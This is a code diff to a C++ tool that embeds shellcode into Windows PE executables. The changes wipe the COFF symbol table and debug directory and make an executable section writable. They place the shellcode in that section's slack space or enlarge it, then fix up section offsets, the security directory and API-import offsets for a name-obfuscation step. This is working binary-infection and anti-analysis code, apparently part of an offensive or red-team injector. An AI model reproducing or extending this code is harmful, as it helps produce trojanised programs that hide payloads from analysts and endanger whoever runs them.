@@ -460,18 +460,81 @@ INT main(INT argc, CHAR** argv){
 			bShellcode,
 			sizeof(bShellcode)
 		);
+	    
+	    	if (lpNtHeader->FileHeader.PointerToSymbolTable)
+		{
+			PIMAGE_SYMBOL lpCOFFSymbol = (PIMAGE_SYMBOL)((DWORD_PTR)lpPeFileInfo->lpDataBuffer +
+				lpNtHeader->FileHeader.PointerToSymbolTable);
+			LPVOID lpCOFFString = (LPVOID)((DWORD_PTR)lpCOFFSymbol + lpNtHeader->FileHeader.NumberOfSymbols * sizeof(IMAGE_SYMBOL));
+
+			if (!Utils::IsValidWritePtr(
+				lpCOFFSymbol,
+				*(PDWORD)lpCOFFString + lpNtHeader->FileHeader.NumberOfSymbols * sizeof(IMAGE_SYMBOL)
+			))
+			{
+				Utils::Printf::Fail("Invalid COFF symbol table");
+				return FALSE;
+			};
+
+			ZeroMemory(
+				lpCOFFSymbol,
+				*(PDWORD)lpCOFFString + lpNtHeader->FileHeader.NumberOfSymbols * sizeof(IMAGE_SYMBOL)
+			);
+
+			lpNtHeader->FileHeader.PointerToSymbolTable = 0;
+			lpNtHeader->FileHeader.NumberOfSymbols = 0;
+		};
+
+		BOOL IsDebugExists = FALSE;
+		if (!Load::PE::IsDirExists(lpNtHeader, IMAGE_DIRECTORY_ENTRY_DEBUG, &IsDebugExists))
+		{
+			Utils::Printf::Fail("Cannot check if IMAGE_DIRECTORY_ENTRY_DEBUG table exists");
+			return FALSE;
+		};
+		if (IsDebugExists)
+		{
+			DWORD dwDebugBaseOffset = 0;
+			DWORD dwDebugSize = 0;
+			if (!Load::PE::GetDirectoryInfo(
+				lpNtHeader,
+				IMAGE_DIRECTORY_ENTRY_DEBUG,
+				&dwDebugBaseOffset,
+				&dwDebugSize,
+				FALSE
+			))
+			{
+				Utils::Printf::Fail("Unable to get the IMAGE_DIRECTORY_ENTRY_DEBUG table information");
+				return FALSE;
+			};
+			PIMAGE_DEBUG_DIRECTORY lpDebugData = (PIMAGE_DEBUG_DIRECTORY)((DWORD_PTR)lpPeFileInfo->lpDataBuffer + dwDebugBaseOffset);
+
+			if (!Utils::IsValidWritePtr(
+				lpDebugData,
+				sizeof(IMAGE_DEBUG_DIRECTORY)
+			))
+			{
+				Utils::Printf::Fail("Invalid debug directory");
+				return FALSE;
+			};
+
+			ZeroMemory(
+				lpDebugData,
+				sizeof(IMAGE_DEBUG_DIRECTORY)
+			);
+
+			GET_DIRECTORY_ENTRY(lpNtHeader, IMAGE_DIRECTORY_ENTRY_DEBUG) = 0;
+			GET_DIRECTORY_SIZE(lpNtHeader, IMAGE_DIRECTORY_ENTRY_DEBUG) = 0;
+		};
 
 		DWORD dwShellcodeOffset = 0;
 		DWORD dwRawSizeNeeded = 0;
 
-		PIMAGE_SECTION_HEADER lpCodeSection = NULL;
+		PIMAGE_SECTION_HEADER lpExecutableSection = NULL;
 		PIMAGE_SECTION_HEADER lpHeaderSection = IMAGE_FIRST_SECTION(lpNtHeader);
 		for (DWORD dwSecIndex = 0; dwSecIndex < lpNtHeader->FileHeader.NumberOfSections; dwSecIndex++) {
-			if (lpNtHeader->OptionalHeader.AddressOfEntryPoint >= lpHeaderSection[dwSecIndex].VirtualAddress
-				&& lpNtHeader->OptionalHeader.AddressOfEntryPoint < lpHeaderSection[dwSecIndex].VirtualAddress +
-				lpHeaderSection[dwSecIndex].Misc.VirtualSize)
+			if (!dwShellcodeOffset && (lpHeaderSection[dwSecIndex].Characteristics & IMAGE_SCN_MEM_EXECUTE))
 			{
-				lpCodeSection = &lpHeaderSection[dwSecIndex];
+				lpExecutableSection = &lpHeaderSection[dwSecIndex];
 				lpHeaderSection[dwSecIndex].Characteristics |= IMAGE_SCN_MEM_WRITE;
 				DWORD dwRealVirtualSize = 0;
 				if (dwSecIndex == lpNtHeader->FileHeader.NumberOfSections - 1)
@@ -484,57 +547,32 @@ INT main(INT argc, CHAR** argv){
 					dwRealVirtualSize = lpHeaderSection[dwSecIndex + 1].VirtualAddress -
 						lpHeaderSection[dwSecIndex].VirtualAddress;
 				};
-				if (dwRealVirtualSize - lpHeaderSection[dwSecIndex].Misc.VirtualSize < dwPaddedShellcodeSize) break;
+				if (dwRealVirtualSize - lpHeaderSection[dwSecIndex].Misc.VirtualSize < dwPaddedShellcodeSize) continue;
 
 				dwShellcodeOffset = lpHeaderSection[dwSecIndex].PointerToRawData + lpHeaderSection[dwSecIndex].Misc.VirtualSize;
 				if (lpHeaderSection[dwSecIndex].SizeOfRawData - lpHeaderSection[dwSecIndex].Misc.VirtualSize >= dwPaddedShellcodeSize)
 				{
-					dwPaddedShellcodeSize = lpHeaderSection[dwSecIndex].SizeOfRawData - lpHeaderSection[dwSecIndex].Misc.VirtualSize;
-					lpHeaderSection[dwSecIndex].Misc.VirtualSize = lpHeaderSection[dwSecIndex].SizeOfRawData;
+					lpHeaderSection[dwSecIndex].Misc.VirtualSize += dwPaddedShellcodeSize;
+					dwPaddedShellcodeSize += lpHeaderSection[dwSecIndex].SizeOfRawData - lpHeaderSection[dwSecIndex].Misc.VirtualSize;
 					dwRawSizeNeeded = 0;
 					break;
 				};
-				dwPaddedShellcodeSize = dwRealVirtualSize - lpHeaderSection[dwSecIndex].Misc.VirtualSize;
-				lpHeaderSection[dwSecIndex].Misc.VirtualSize = dwRealVirtualSize;
-				dwRawSizeNeeded = dwRealVirtualSize - lpHeaderSection[dwSecIndex].SizeOfRawData;
-				
-				BOOL IsDebugExists = FALSE;
-				if (!Load::PE::IsDirExists(lpNtHeader, IMAGE_DIRECTORY_ENTRY_DEBUG, &IsDebugExists))
+
+				lpHeaderSection[dwSecIndex].Misc.VirtualSize += dwPaddedShellcodeSize;
+
+				DWORD dwVirtualRawSpace = 0;
+				if ((dwVirtualRawSpace = Utils::AlignUp(
+					dwShellcodeOffset,
+					lpNtHeader->OptionalHeader.FileAlignment
+				) - dwShellcodeOffset) < dwPaddedShellcodeSize)
 				{
-					Utils::Printf::Fail("Cannot check if IMAGE_DIRECTORY_ENTRY_DEBUG table exists");
-					return FALSE;
-				};
-				if (IsDebugExists)
-				{
-					DWORD dwDebugBaseOffset = 0;
-					DWORD dwDebugSize = 0;
-					if (!Load::PE::GetDirectoryInfo(
-						lpNtHeader,
-						IMAGE_DIRECTORY_ENTRY_DEBUG,
-						&dwDebugBaseOffset,
-						&dwDebugSize,
-						FALSE
-					))
-					{
-						Utils::Printf::Fail("Unable to get the IMAGE_DIRECTORY_ENTRY_DEBUG table information");
-						return FALSE;
-					};
-					PIMAGE_DEBUG_DIRECTORY lpDebugData = (PIMAGE_DEBUG_DIRECTORY)((DWORD_PTR)lpPeFileInfo->lpDataBuffer + dwDebugBaseOffset);
-					
-					if (!Utils::IsValidReadPtr(
-						lpDebugData,
-						sizeof(IMAGE_DEBUG_DIRECTORY)
-					))
-					{
-						Utils::Printf::Fail("Invalid debug directory");
-						return FALSE;
-					};
-					
-					if (lpDebugData->PointerToRawData >= lpHeaderSection[dwSecIndex].PointerToRawData + lpHeaderSection[dwSecIndex].SizeOfRawData)
-					{
-						lpDebugData->PointerToRawData += dwRawSizeNeeded;
-					};
-				};
+					dwRawSizeNeeded = Utils::AlignUp(
+						dwPaddedShellcodeSize - dwVirtualRawSpace,
+						lpNtHeader->OptionalHeader.FileAlignment
+					);
+				}
+				else dwRawSizeNeeded = 0;
+				dwPaddedShellcodeSize += dwRawSizeNeeded + lpHeaderSection[dwSecIndex].SizeOfRawData - lpHeaderSection[dwSecIndex].Misc.VirtualSize;
 
 				BOOL IsSecurityExists = FALSE;
 				if (!Load::PE::IsDirExists(lpNtHeader, IMAGE_DIRECTORY_ENTRY_SECURITY, &IsSecurityExists))
@@ -562,7 +600,7 @@ INT main(INT argc, CHAR** argv){
 						GET_DIRECTORY_ENTRY(lpNtHeader, IMAGE_DIRECTORY_ENTRY_SECURITY) += dwRawSizeNeeded;
 					};
 				};
-				
+
 				lpHeaderSection[dwSecIndex].SizeOfRawData += dwRawSizeNeeded;
 				lpNtHeader->OptionalHeader.SizeOfCode += dwRawSizeNeeded;
 #if ! (defined(_M_X64) || defined(__amd64__))
@@ -572,13 +610,13 @@ INT main(INT argc, CHAR** argv){
 				};
 #endif
 			}
-			else if (lpCodeSection && lpHeaderSection[dwSecIndex].PointerToRawData
+			else if (dwRawSizeNeeded && lpHeaderSection[dwSecIndex].PointerToRawData
 				) lpHeaderSection[dwSecIndex].PointerToRawData += dwRawSizeNeeded;
 		};
 
-		if (!lpCodeSection)
+		if (!lpExecutableSection)
 		{
-			Utils::Printf::Fail("Unable to get the code section IMAGE_SECTION_HEADER structure");
+			Utils::Printf::Fail("Unable to get any executable section IMAGE_SECTION_HEADER structure");
 			return FALSE;
 		};
 
@@ -651,7 +689,7 @@ INT main(INT argc, CHAR** argv){
 			};
 		}
 		else dwShellcodeRVA = 
-			dwShellcodeOffset - lpCodeSection->PointerToRawData + lpCodeSection->VirtualAddress;
+			dwShellcodeOffset - lpExecutableSection->PointerToRawData + lpExecutableSection->VirtualAddress;
 
 		for (auto const& ObfuscateByNameElement : ObfuscateByNameArr)
 		{
@@ -677,7 +715,7 @@ INT main(INT argc, CHAR** argv){
 			};
 
 			if (lpApiImportOffset >= 
-				(lpCodeSection->PointerToRawData + lpCodeSection->SizeOfRawData - dwRawSizeNeeded))
+				(lpExecutableSection->PointerToRawData + lpExecutableSection->SizeOfRawData - dwRawSizeNeeded))
 			{
 				lpApiImportOffset -= dwRawSizeNeeded;
 			};
